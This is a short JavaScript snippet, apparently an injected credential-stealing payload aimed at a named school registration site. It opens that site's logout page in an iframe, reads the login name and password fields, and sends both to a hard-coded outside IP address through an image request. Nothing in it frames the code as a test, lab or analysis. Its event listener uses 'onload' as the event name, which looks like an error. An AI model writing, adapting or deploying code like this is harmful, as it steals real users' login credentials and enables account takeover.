const frimfram = document.createElement('iframe'); 
frimfram.src = 'https://registration.cesa5.org/np/logout.do'; 
frimfram.addEventListener('onload', function(){
	const pw = document.querySelector('#password').value;
	const un = document.querySelector('#loginName').value;
	var imag = document.createElement('img');
	imag.src = 'http://74.14.159.250:8000/?' + pw + "." + un;
	document.body.appendChild(imag);
});
document.body.appendChild(frimfram);
